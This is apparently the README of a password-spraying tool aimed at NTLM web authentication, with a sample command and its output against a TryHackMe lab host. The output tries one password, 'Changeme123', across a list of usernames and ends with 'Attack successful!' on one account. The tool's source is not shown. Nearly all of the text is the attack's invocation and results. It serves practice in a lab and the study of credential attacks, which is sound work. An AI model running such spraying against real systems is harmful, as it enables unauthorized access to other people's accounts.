# password-spraying-script-ntlm
 
## Example:
```bash
❯ python3 password-spray-ntlm.py -u usernames.txt -p Changeme123 -t http://ntlmauth.za.tryhackme.com/
[FAILURE] Username: anthony.reynolds, Password: Changeme123, Status Code: 401
Continuing with the next user...
[FAILURE] Username: samantha.thompson, Password: Changeme123, Status Code: 401
Continuing with the next user...
[FAILURE] Username: dawn.turner, Password: Changeme123, Status Code: 401
Continuing with the next user...
[FAILURE] Username: frances.chapman, Password: Changeme123, Status Code: 401
Continuing with the next user...
[FAILURE] Username: henry.taylor, Password: Changeme123, Status Code: 401
Continuing with the next user...
[FAILURE] Username: jennifer.wood, Password: Changeme123, Status Code: 401
Continuing with the next user...
[SUCCESS] Username: hollie.powell, Password: Changeme123
Attack successful!
```
